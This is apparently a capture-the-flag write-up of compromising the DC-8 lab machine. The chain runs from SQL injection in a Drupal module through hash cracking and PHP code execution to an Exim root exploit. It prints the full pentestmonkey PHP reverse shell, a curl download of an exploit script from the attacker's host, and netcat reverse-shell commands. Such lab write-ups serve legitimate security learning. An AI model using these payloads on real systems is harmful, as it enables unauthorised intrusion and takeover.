
## Step 1: The Basics

`nmap -p- -sC -sV -T3 dc-8`

This is a full TCP port scan (`-p-`), running default scripts (`-sC`) and version detection (`-sV`) at a moderate timing template (`-T3`, slower and stealthier than `-T4` or `-T5`, useful when a box seems sensitive to aggressive scanning).
```
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1  
80/tcp    open  http    Apache httpd  
|_http-generator: Drupal 7 (http://drupal.org)  
31337/tcp open  Elite?
```

SSH, a Drupal 7 site, and a third port, 31337, with nothing obviously listening yet. That last one turned out to matter far more than it looked like at first.

## Step 2: Drupal Fingerprinting Comes Up Short

`droopescan scan drupal -u http://dc-8`

This confirmed Drupal 7.67 and listed several installed modules (ctools, views, webform, ckeditor, a php module) but nothing that pointed directly at a known exploit. Time to look at the site by hand.

## Step 3: An Error Message That Says Too Much

One page loaded content through a `nid` parameter:

`http://dc-8/?nid=`3``

Feeding it garbage instead of a number broke the page in a very informative way:

PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column '3ehtrhrth' in  
'where clause': SELECT title FROM node WHERE nid = 3ehtrhrth; Array ( ) in  
mypages_init() (line 6 of /var/www/html/sites/all/modules/mypages/mypages.module).

This single error confirmed the injection point, showed the raw SQL query being built, and even named the exact file and line of vulnerable code, inside a custom module called `mypages`, not Drupal core.

## Step 4: Automating the Injection

`sqlmap -u dc-8/?nid=2 --dbs --batch --risk 3 --level 5`

Breaking that down:

- `-u dc-8/?nid=2` tells SQLMap which URL and parameter to test
- `--dbs` asks SQLMap to enumerate every database it can find once it confirms the injection
- `--batch` tells SQLMap to accept its own default answer at every prompt instead of asking interactively, useful for unattended runs
- `--risk 3` raises the risk level of the injection payloads SQLMap will try, since higher-risk payloads (like heavier boolean or time-based tests) can be more disruptive but also more thorough
- `--level 5` raises how deeply SQLMap tests every parameter and header, including ones it wouldn't normally bother with at the default level

This returned two databases:

```bash
d7db  
information_schema

sqlmap -u dc-8/?nid=2 -D d7db --tables --batch --risk 3 --level 5
```

`-D d7db` points SQLMap at that specific database, and `--tables` lists everything inside it. The `users` table was the obvious next target.

sqlmap -u dc-8/?nid=2 -D d7db -T users --dump

`-T users` narrows the target to that one table, and `--dump` pulls its full contents. This returned two password hashes:

admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z  
john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF

## Step 5: Cracking a Hash

first find the version of the hash

```bash
──(kali㉿hashi)-[~]
└─$ echo "$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF" > hash8.txt
┌──(kali㉿hashi)-[~]
└─$ hashid hash8.txt
--File 'hash8.txt'--
Analyzing '$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF'
[+] Drupal > v7.x 
--End of file 'hash8.txt'--
```

and it revealed the version as ==Drupal v7==   and in the next command i use that as the format

```bash
   
┌──(kali㉿hashi)-[~]
└─$ john hash8.txt -w /usr/share/wordlists/rockyou.txt --format=drupal7
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
turtle           (?)     
1g 0:00:00:01 DONE (2026-10-01 05:51) 0.5494g/s 615.3p/s 615.3c/s 615.3C/s swimmer..williams
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Step 6: Turning a Login Into Code Execution

john : turtle

Logging in at `/user` gave access as a regular, low-privileged Drupal account. Looking through what that account could actually do, the webform module allowed editing form field settings, including the output format used to render a field's value:

Content -> Edit (Contact us webform) -> Webform tab -> Form Settings

Drupal supports rendering content as raw, executable PHP when a field is explicitly set to the “PHP code” text format. That is intentional functionality, not a bug, but it becomes a direct code execution path the moment any account can reach it.

## Step 7: The Full Reverse Shell Payload

I set the field’s format to PHP code and pasted in the standard pentestmonkey reverse shell, configured for my listener:

<?php  
// php-reverse-shell - A Reverse Shell implementation in PHP  
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net  
//  
// This tool may be used for legal purposes only. Users take full responsibility  
// for any actions performed using this tool. The author accepts no liability  
// for damage caused by this tool. If these terms are not acceptable to you, then  
// do not use this tool.  
//  
// This program is free software; you can redistribute it and/or modify  
// it under the terms of the GNU General Public License version 2 as  
// published by the Free Software Foundation.  
//  
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.  
set_time_limit (0);  
$VERSION = "1.0";  
$ip = '192.168.56.119';  // CHANGE THIS  
$port = 3333;       // CHANGE THIS  
$chunk_size = 1400;  
$write_a = null;  
$error_a = null;  
$shell = 'uname -a; w; id; /bin/sh -i';  
$daemon = 0;  
$debug = 0;  
// Daemonise ourself if possible to avoid zombies later  
if (function_exists('pcntl_fork')) {  
    $pid = pcntl_fork();  
    if ($pid == -1) {  
        printit("ERROR: Can't fork");  
        exit(1);  
    }  
    if ($pid) {  
        exit(0);  // Parent exits  
    }  
    if (posix_setsid() == -1) {  
        printit("Error: Can't setsid()");  
        exit(1);  
    }  
    $daemon = 1;  
} else {  
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");  
}  
chdir("/");  
umask(0);  
// Open reverse connection  
$sock = fsockopen($ip, $port, $errno, $errstr, 30);  
if (!$sock) {  
    printit("$errstr ($errno)");  
    exit(1);  
}  
// Spawn shell process  
$descriptorspec = array(  
    0 => array("pipe", "r"),  
    1 => array("pipe", "w"),  
    2 => array("pipe", "w")  
);  
$process = proc_open($shell, $descriptorspec, $pipes);  
if (!is_resource($process)) {  
    printit("ERROR: Can't spawn shell");  
    exit(1);  
}  
stream_set_blocking($pipes[0], 0);  
stream_set_blocking($pipes[1], 0);  
stream_set_blocking($pipes[2], 0);  
stream_set_blocking($sock, 0);  
printit("Successfully opened reverse shell to $ip:$port");  
while (1) {  
    if (feof($sock)) {  
        printit("ERROR: Shell connection terminated");  
        break;  
    }  
    if (feof($pipes[1])) {  
        printit("ERROR: Shell process terminated");  
        break;  
    }  
    $read_a = array($sock, $pipes[1], $pipes[2]);  
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  
    if (in_array($sock, $read_a)) {  
        $input = fread($sock, $chunk_size);  
        fwrite($pipes[0], $input);  
    }  
    if (in_array($pipes[1], $read_a)) {  
        $input = fread($pipes[1], $chunk_size);  
        fwrite($sock, $input);  
    }  
    if (in_array($pipes[2], $read_a)) {  
        $input = fread($pipes[2], $chunk_size);  
        fwrite($sock, $input);  
    }  
}  
fclose($sock);  
fclose($pipes[0]);  
fclose($pipes[1]);  
fclose($pipes[2]);  
proc_close($process);  
function printit ($string) {  
    if (!$daemon) {  
        print "$string\n";  
    }  
}  
?>

What this script actually does: it opens an outbound TCP connection back to the attacker’s IP and port, then spawns `/bin/sh -i` (an interactive shell) with its input and output piped directly through that socket. Whoever is listening on the other end effectively gets a live terminal running as whatever user the web server process runs as.

Before saving, I started a listener to catch the connection:

nc -nlvp 3333

`-n` skips DNS resolution (faster, avoids leaking lookups), `-l` puts netcat into listen mode, `-v` adds verbose output so I can see the connection when it lands, and `-p 3333` sets the port to listen on, matching the port hardcoded in the PHP payload above.

Submitting the site’s “Contact us” form triggered Drupal to render that field, which meant executing the PHP inside it, and the listener caught a shell.

## Step 8: Cleaning Up the Shell

python -c 'import pty; pty.spawn("/bin/bash")'

This upgrades a raw, limited reverse shell into something closer to a real interactive terminal by spawning bash through Python’s pty (pseudo-terminal) module, enabling things like tab completion and proper job control.

## Step 9: Finding Exim

Checking `sudo -l` and hunting for SUID binaries turned up **Exim**, the mail transfer agent, running with elevated permissions. Exim versions 4.87 through 4.91 are affected by **CVE-2019-10149**, a local privilege escalation vulnerability caused by improper validation of recipient addresses during message delivery, which allows an attacker to smuggle a shell command into an address the server will actually execute.

## Step 10: The Full Exploit Script

I searched for a exploit in the google and found a exploit in exploit db and  downloaded it to my kali machine 


Reading through it: the script has two modes. The `setuid` method compiles a tiny local helper program, delivers a crafted email whose recipient address contains an Exim `${run{...}}` expansion, an Exim-specific syntax that, on vulnerable versions, gets evaluated and executed as a real shell command instead of being treated as plain text. That payload tells the mail server to `chown` and `chmod` the helper to be setuid-root. The `netcat` method does something more direct: its `${run{...}}` payload tells Exim to spawn a netcat listener bound to port 31337 (that mystery port from the very first Nmap scan) that hands out a root shell to anyone who connects, no compiler required.

## Step 11: copying it to the victim machine and running the script

```bash
python3 -m http.server 8000
```

This starts a simple HTTP server on my own machine, serving whatever is in the current directory, so the target can pull the exploit script over the network without needing an existing outbound path already set up.

```bash
curl http://192.168.56.119:8000/eximexploit.sh -o /tmp/eximexploit.sh
```


Run from the target, this downloads the script and saves it to `/tmp/eximexploit.sh`.

`chmod +x eximexploit.sh

Marks the script executable.

`nc -nlvp 31337

A listener on the exact port the netcat payload will bind to.

`./eximexploit.sh -m netcat

This runs the script with the netcat method selected. Behind the scenes, it opens a raw connection to the local mail service on port 25 (`/dev/tcp/localhost/25` is bash's built-in way of opening a TCP socket without needing netcat itself), sends a minimal SMTP conversation (HELO, MAIL FROM, RCPT TO), and embeds the malicious recipient address inside the RCPT TO command. Once delivery processing runs, the injected shell command executes as root.

`nc -e /bin/bash 192.168.56.119 31337

With the payload’s netcat listener now live on the target, this command connects to it and hands back `/bin/bash`, `-e` tells netcat to execute that program and pipe its input/output through the connection, which is what actually delivers the interactive root shell back to me.

## Step 12: The Final Flag

cd /root  
cat theflag.txt

A “Brilliant, you have succeeded!” banner and a closing note from the box’s author. Machine complete.